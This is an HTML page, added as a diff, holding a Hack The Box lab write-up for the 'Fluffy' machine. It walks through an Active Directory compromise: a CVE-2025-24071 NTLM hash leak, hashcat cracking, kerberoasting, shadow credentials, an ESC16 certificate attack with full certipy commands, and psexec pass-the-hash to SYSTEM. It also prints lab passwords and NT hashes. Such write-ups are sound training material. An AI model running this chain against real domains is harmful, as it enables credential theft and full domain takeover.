@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retired Writeup (HTB)</title>
+    <link rel="stylesheet" href="../../style/styles.css">
+    <link rel="stylesheet" href="model.css"">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+    <main>
+        <article class="article-container">
+            <div class="article-header">
+                <h1 class="article-title">Fluffy - HTB</h1>
+                <div class="article-meta">
+                    <span class="article-tags">
+                        <i class="fas fa-tags"></i>
+                        <span class="tag">Web Application</span>
+                        <span class="tag">Linux</span>
+                        <span class="tag">Reverse Engineering</span>
+                        <span class="tag">THM</span>
+                    </span>
+                    <span class="article-date"><i class="far fa-calendar"></i> 27 de Outubro, 2025</span>
+                </div>
+            </div>
+
+            <div class="article-content">
+                <h2>Introduction</h2>
+                <p>
+                    Difficulty: Easy<br>
+                    Machine: Fluffy<br>
+                    Credentials: j.fleischman / J0elTHEM4n1990!<br>
+                    IP Address: 10.10.11.69
+                </p>
+                <p>First, we run a network scan</p>
+                <img src="./assets/fluffy/fluffy1.png" alt="">
+
+                <p>We see interesting information and realize this is a Domain Controller, so we start by configuring our DNS.</p>
+                <p>
+                    Domain: fluffy.htb<br>
+                    DC: DC01.fluffy.htb
+                </p>
+                <p>Now we begin enumerating the network. First we list the SMB:</p>
+                <img src="./assets/fluffy/fluffy2.png" alt="">
+                <p>After analyzing the SMB, we find a PDF that contains interesting information about some recent possible vulnerabilities that may still affect the machine.</p>
+                <img src="./assets/fluffy/fluffy3.png" alt="">
+                <p>We perform some research, and the CVE we will use is CVE-2025-24071, it's a flaw in Windows File Explorer that allows an attacker to induce a user's system to perform an "action" over the network, which can chain into an NTLM hash leak via a relay attack.</p>
+                <img src="./assets/fluffy/fluffy4.png" alt="">
+                <p>The vulnerability lies in handling files with the <code>.library-ms</code> extension, especially when packaged in zip/rar and extracted. Explorer tries to access SMB network paths contained within the file. So, to build the payload, just create an <code>exploit.library-ms</code> XML file with the url tag pointing to our machine.</p>
+                <img src="./assets/fluffy/fluffy5.png" alt="">
+                <p>We set responder to listen</p>
+                <img src="./assets/fluffy/fluffy7.png" alt="">
+                <p>We upload the zipped file to the SMB and wait with our responder listening</p>
+                <img src="./assets/fluffy/fluffy8.png" alt="">
+                <p>Thus, when the user unpacks the file, their authentication hash will be sent to our responder.</p>
+                <img src="./assets/fluffy/fluffy9.png" alt="">
+                <p>Now we just crack the hash using hashcat</p>
+                <code>hashcat -m 5600 -a 0 -O --force hash.txt rockyou.txt</code>
+                <img src="./assets/fluffy/fluffy10.png" alt="">
+                <code>P.agila:prometheusx-303</code>
+                <p><br>We obtained another valid user, now we enumerate where we can access with our current users.</p>
+                <code>nxc ldap 10.10.11.69 -u users.txt -p passwords.txt --continue-on-success</code>
+                <img src="./assets/fluffy/fluffy11.png" alt="">
+                <p>We perform a kerberoast attack to obtain the hash of a service account.</p>
+                <code>nxc ldap 10.10.11.69 -u p.agila -p prometheusx-303 --kerberoasting outputk.txt</code>
+                <img src="./assets/fluffy/fluffy12.png" alt="">
+                <p>But we failed to crack it. We then use blood-python to enumerate the AD, load it into BloodHound to get a better view and, analyzing it, we manage to find a list of users.</p>
+                <pre><code>j.fleischman
+j.coffey
+krbtgt
+p.agila
+winrm_svc
+administrator
+ca_svc
+ldap_svc</code></pre>
+                <p>In BloodHound, we notice that our user p.agila has "GenericAll" on the Service Accounts group</p>
+                <img src="./assets/fluffy/fluffy13.png" alt="">
+                <p>We can then use this permission to add ourselves to that group and, from there, perform a shadow credentials attack, thereby obtaining the NTLM hashes of the service accounts</p>
+                <img src="./assets/fluffy/fluffy14.png" alt="">
+                <pre><code>NT hash for ca_svc :ca0f4f9e9eb8a092addf53bb03fc98c8
+NT hash for ldap_svc :22151d74ba3de931a352cba1f9393a37
+NT hash for winrm_svc :33bd09dcd697600edf6b3a7af4875767</code></pre>
+                <p>Now, by "guessing", we see that "ca_svc" may be related to ADCS, so we enumerate ADCS using its hash as authentication</p>
+                <pre><code>certipy-ad find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enable -text</code></pre>
+                <img src="./assets/fluffy/fluffy19.png" alt="">
+                <p>The enumeration showed us that we can perform a potential ESC16 attack.</p>
+                <img src="./assets/fluffy/fluffy21.png" alt="">
+                <p>We found an ESC16 vulnerability. It occurs when the CA (Certification Authority) is configured to disable the inclusion of OID 1.3.6.1.4.1.311.25.2 which corresponds to the security extension in all issued certificates.</p>
+                <p>Now, to perform the attack, first we need to modify the UPN (UserPrincipalName) of the <code>ca_svc</code> account (for which we have GenericWrite). The target is administrator, so we will use this modified account (ca_svc) to request a certificate on behalf of another account (administrator), thus allowing us to authenticate as it.</p>
+                <pre><code>certipy-ad account update -username p.agila@fluffy.htb -p prometheusx-303 -upn 'administrator@fluffy.htb' -user 'ca_svc' -dc-ip 10.10.11.69</code></pre>
+                <img src="./assets/fluffy/fluffy16.png" alt="">
+                <p>Now we request the certificate with the command:</p>
+                <pre><code>certipy req -username ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -ca fluffy-DC01-CA -templates User -dc-ip 10.10.11.69</code></pre>
+                <img src="./assets/fluffy/fluffy17.png" alt="">
+                <p>We revert the UPN of <code>ca_svc</code> back to its original with the command</p>
+                <pre><code>certipy-ad account update -username p.agila@fluffy.htb -p prometheusx-303 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' -dc-ip 10.10.11.69</code></pre>
+                <p>And now we authenticate as administrator:</p>
+                <pre><code>certipy-ad auth -pfx administrator.pfx -username administrator -domain fluffy.htb -dc-ip 10.10.11.69</code></pre>
+                <p>Thus we obtain the administrator's NTLM hash</p>
+                <img src="./assets/fluffy/fluffy22.png" alt="">
+                <p>Now we can run psexec passing the hash as authentication and that's it, we acquire <code>NT AUTHORITY\SYSTEM</code> on the machine.</p>
+                <img src="./assets/fluffy/fluffy18.png" alt="">
+                <p></p>
+            </div>
+
+            <div class="article-footer">
+                <a href="../../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to the start</a>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="social-links">
+            <a href="https://github.com/lsbxa" target="_blank"><i class="fab fa-github"></i></a>
+            <a href="https://www.linkedin.com/in/marcelo-lisboa7/" target="_blank"><i class="fab fa-linkedin"></i></a>
+        </div>
+        <p>&copy; 2025 Memory Leak</p>
+    </footer>
+        <div id="imageModal" class="image-modal">
+        <span class="image-modal-close">&times;</span>
+        <img id="modalImage" src="" alt="">
+    </div>
+
+    <script>
+        const modal = document.getElementById('imageModal');
+        const modalImg = document.getElementById('modalImage');
+        const closeBtn = document.querySelector('.image-modal-close');
+        const images = document.querySelectorAll('.article-content img');
+
+        images.forEach(img => {
+            img.addEventListener('click', function() {
+                modal.classList.add('active');
+                modalImg.src = this.src;
+            });
+        });
+
+        closeBtn.addEventListener('click', () => {
+            modal.classList.remove('active');
+        });
+
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                modal.classList.remove('active');
+            }
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && modal.classList.contains('active')) {
+                modal.classList.remove('active');
+            }
+        });
+    </script>
+</body>
+</html>
